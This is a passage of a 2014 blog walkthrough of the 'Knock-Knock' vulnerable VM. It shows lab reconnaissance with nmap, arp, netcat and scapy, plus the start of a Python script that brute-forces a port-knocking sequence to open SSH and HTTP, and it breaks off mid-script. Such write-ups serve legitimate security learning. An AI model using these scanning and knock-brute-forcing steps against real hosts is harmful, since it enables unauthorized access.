
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>#!/slash/note</title>
  <meta name="author" content="Leon Jacobs">

  
  <meta name="description" content="introduction Knock-Knock is a vulnerable boot2root VM by @zer0w1re and sure as heck was packed with interesting twists and things to learn! I figured &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://leonjza.github.io">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="#!/slash/note" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-44457032-2']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">#!/slash/note</a></h1>
  
    <h2>A checkbox unchecker's notepad</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:leonjza.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">knock-knock who’s there?</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-10-14T09:14:26+02:00" pubdate data-updated="true">Oct 14<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>introduction</h2>

<p><a href="http://vulnhub.com/series/knock-knock,53/">Knock-Knock</a> is a vulnerable boot2root VM by <a href="https://twitter.com/zer0w1re">@zer0w1re</a> and sure as heck was packed with interesting twists and things to learn!</p>

<p>I figured I&rsquo;d just <em>have a quick look™</em>, and midnight that evening ended up with <em>root</em> privileges :D</p>

<p>As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &lsquo;knocking&rsquo; on the door.</p>

<blockquote><p>“Theodore!”</p>

<p>“Theodore who?”</p>

<p>“Theodore wasn&rsquo;t open so I knocked”</p></blockquote>

<h2>getting started</h2>

<p>As always, the vm&rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched <code>arp</code> for any new entries. This presented the first hurdle. A ping scan showed no new IP&rsquo;s in the network range my VM&rsquo;s were in (192.168.56.0/24):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo nmap -sN 192.168.56.0/24
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 09:51 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.1
</span><span class='line'>Host is up <span class="o">(</span>0.000030s latency<span class="o">)</span>.
</span><span class='line'>All 1000 scanned ports on 192.168.56.1 are closed <span class="o">(</span>936<span class="o">)</span> or open<span class="p">|</span>filtered <span class="o">(</span>64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>1 host up<span class="o">)</span> scanned in 14.99 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Only the gateway was alive. A <code>arp -a</code> however spilled some of the beans:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>arp -i vboxnet0 -a
</span><span class='line'>? <span class="o">(</span>192.168.56.0<span class="o">)</span> at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.1<span class="o">)</span> at a:0:27:0:0:0 on vboxnet0 ifscope permanent <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.2<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>? <span class="o">(</span>192.168.56.201<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.202<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.203<span class="o">)</span> at 8:0:27:be:dd:c8 on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.204<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>? <span class="o">(</span>192.168.56.205<span class="o">)</span> at <span class="o">(</span>incomplete<span class="o">)</span> on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>? <span class="o">(</span>192.168.56.255<span class="o">)</span> at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope <span class="o">[</span>ethernet<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Hello <code>.203</code>! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ping -c 2 192.168.56.203
</span><span class='line'>PING 192.168.56.203 <span class="o">(</span>192.168.56.203<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
</span><span class='line'>From 192.168.56.203 <span class="nv">icmp_seq</span><span class="o">=</span>1 Destination Port Unreachable
</span><span class='line'>From 192.168.56.203 <span class="nv">icmp_seq</span><span class="o">=</span>2 Destination Port Unreachable
</span><span class='line'>
</span><span class='line'>--- 192.168.56.203 ping statistics ---
</span><span class='line'>2 packets transmitted, 0 received, +2 errors, 100% packet loss, <span class="nb">time </span>999ms
</span></code></pre></td></tr></table></div></figure>


<p>While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal <code>nmap</code> scan:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -sV --reason 192.168.56.203 -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 10:03 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0016s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65534 filtered ports
</span><span class='line'>Reason: 65534 no-responses
</span><span class='line'>PORT     STATE SERVICE REASON  VERSION
</span><span class='line'>1337/tcp open  waste?  syn-ack
</span><span class='line'>
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
</span><span class='line'>SF-Port1337-TCP:V<span class="o">=</span>6.46%I<span class="o">=</span>7%D<span class="o">=</span>10/14%Time<span class="o">=</span>543CEE50%P<span class="o">=</span>i686-pc-linux-gnu%r<span class="o">(</span>NUL
</span><span class='line'>SF:L,15,<span class="s2">&quot;\[12247,\x202759,\x2026802\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,15,<span class="s2">&quot;\[37866,\x202</span>
</span><span class='line'><span class="s2">SF:9242,\x203904\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,15,<span class="s2">&quot;\[29185,\x207368,\x2028937\]\n&quot;</span><span class="o">)</span>%r
</span><span class='line'>SF:<span class="o">(</span>HTTPOptions,15,<span class="s2">&quot;\[55772,\x205315,\x2050180\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,13,<span class="s2">&quot;\[9</span>
</span><span class='line'><span class="s2">SF:301,\x2026341,\x20574\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,16,<span class="s2">&quot;\[34002,\x2046353,\x2023995\</span>
</span><span class='line'><span class="s2">SF:]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReq,16,<span class="s2">&quot;\[47043,\x2037532,\x2024012\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>DNSSt
</span><span class='line'>SF:atusRequest,15,<span class="s2">&quot;\[31914,\x208919,\x2027965\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Help,15,<span class="s2">&quot;\[63865,\x2</span>
</span><span class='line'><span class="s2">SF:07077,\x2055801\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,15,<span class="s2">&quot;\[30406,\x208520,\x2047713\]\</span>
</span><span class='line'><span class="s2">SF:n&quot;</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,16,<span class="s2">&quot;\[10459,\x2050977,\x2063996\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,16,<span class="s2">&quot;\</span>
</span><span class='line'><span class="s2">SF:[61080,\x2038407,\x2048416\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>X11Probe,15,<span class="s2">&quot;\[61127,\x2058212,\x203</span>
</span><span class='line'><span class="s2">SF:856\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,16,<span class="s2">&quot;\[11007,\x2051452,\x2038765\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>L
</span><span class='line'>SF:PDString,15,<span class="s2">&quot;\[5738,\x2063719,\x2026394\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LDAPBindReq,14,<span class="s2">&quot;\[14292</span>
</span><span class='line'><span class="s2">SF:,\x20937,\x2020668\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,16,<span class="s2">&quot;\[33684,\x2058491,\x2031373\]</span>
</span><span class='line'><span class="s2">SF:\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>LANDesk-RC,16,<span class="s2">&quot;\[58946,\x2030941,\x2053345\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>TerminalServe
</span><span class='line'>SF:r,15,<span class="s2">&quot;\[6672,\x2031370,\x2053882\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>NCP,16,<span class="s2">&quot;\[15356,\x2041972,\x20</span>
</span><span class='line'><span class="s2">SF:52087\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC,16,<span class="s2">&quot;\[51444,\x2044303,\x2013901\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>WMSReque
</span><span class='line'>SF:st,13,<span class="s2">&quot;\[87,\x2044952,\x2060309\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,15,<span class="s2">&quot;\[51073,\x204686</span>
</span><span class='line'><span class="s2">SF:0,\x206777\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>afp,16,<span class="s2">&quot;\[30287,\x2064026,\x2029364\]\n&quot;</span><span class="o">)</span>%r<span class="o">(</span>kumo-ser
</span><span class='line'>SF:ver,14,<span class="s2">&quot;\[17824,\x2048485,\x20579\]\n&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 5521.11 seconds
</span></code></pre></td></tr></table></div></figure>


<h2>knock knock&hellip;</h2>

<p><code>tcp/1337</code> was the only open port on the machine. I promptly connected to it to see what we have:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nc -vn 192.168.56.203 1337
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.203<span class="o">]</span> 1337 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="o">[</span>6605, 29872, 38566<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>root@kali:~# nc -vn 192.168.56.203 1337
</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.56.203<span class="o">]</span> 1337 <span class="o">(</span>?<span class="o">)</span> open
</span><span class='line'><span class="o">[</span>43059, 22435, 17432<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.</p>

<p><a href="http://en.wikipedia.org/wiki/Port_knocking">Port knocking</a> generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &lsquo;knocked&rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.</p>

<p>There are plenty of implementations of port knocking out there. My personal favorite being <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> by <a href="https://twitter.com/moxie">@moxie</a>. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> tails the <code>kern.log</code> and reacts on the correct sequences.</p>

<p>This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.</p>

<h2>&hellip;whos there?</h2>

<p>So with the <code>tcp/1337</code> service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using <code>nmap</code> to scan them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="k">for </span>PORT in 43059 22435 17432<span class="p">;</span> <span class="k">do </span>nmap -PN 192.168.56.203 -p <span class="nv">$PORT</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>43059/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.06 seconds
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>22435/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.13 seconds
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:25 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up.
</span><span class='line'>PORT      STATE    SERVICE
</span><span class='line'>17432/tcp filtered unknown
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 2.07 seconds
</span></code></pre></td></tr></table></div></figure>


<p>With that done, I rescanned the box for any new open ports but nothing was different. I retried the <code>nmap</code> loop just to make sure, but it did not appear to make a difference.</p>

<p>Remembering that the sequence changed every time you connected to the <code>tcp/1337</code> service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the <code>tcp/1337</code> service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across <a href="https://github.com/jvinet/knock">knockd</a>. I downloaded the <a href="https://github.com/jvinet/knock/blob/master/src/knock.c">client</a> and compiled locally with <code>gcc knock.c -o knock</code> and tested to see if this makes any difference.</p>

<p>Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.</p>

<h2>22 and 80 too</h2>

<p>The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the <code>tcp/1337</code> service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt;&gt;&gt; <span class="nv">ip</span><span class="o">=</span>IP<span class="o">(</span><span class="nv">dst</span><span class="o">=</span><span class="s2">&quot;192.168.56.203&quot;</span><span class="o">)</span>
</span><span class='line'>&gt;&gt;&gt; <span class="nv">SYN</span><span class="o">=</span>TCP<span class="o">(</span><span class="nv">dport</span><span class="o">=</span>40508,flags<span class="o">=</span><span class="s2">&quot;S&quot;</span><span class="o">)</span>
</span><span class='line'>&gt;&gt;&gt; send<span class="o">(</span>ip/SYN<span class="o">)</span>
</span><span class='line'>.
</span><span class='line'>Sent 1 packets.
</span><span class='line'>&gt;&gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>After quite some time, suddenly, nmap reports <code>tcp/22</code> and <code>tcp/80</code> as open&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.203
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 11:40 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.203
</span><span class='line'>Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 998 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>80/tcp open  http
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 4.98 seconds
</span></code></pre></td></tr></table></div></figure>


<p><strong>W.T.F.</strong> I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.</p>

<p>With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">destination</span> <span class="o">=</span> <span class="s">&quot;192.168.56.203&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">clean_up_ports</span><span class="p">(</span><span class="n">raw_string</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot; Clean up the raw string received on the socket&quot;&quot;&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_string</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Remove the first [</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;[&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># Remove the second ]</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;]&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># split by commas</span>
</span><span class='line'>    <span class="n">first_list</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># start e empty return list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">first_list</span><span class="p">:</span>
</span><span class='line'>        <span class="c"># strip the whitespace around the string</span>
</span><span class='line'>        <span class="c"># and cast to a integer</span>
</span><span class='line'>        <span class="n">ports</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span>  <span class="n">ports</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Getting sequence&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>
</span><span class='line'>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Unable to connect to </span><span class="si">%s</span><span class="s"> on port 1337. </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># receive the list</span>
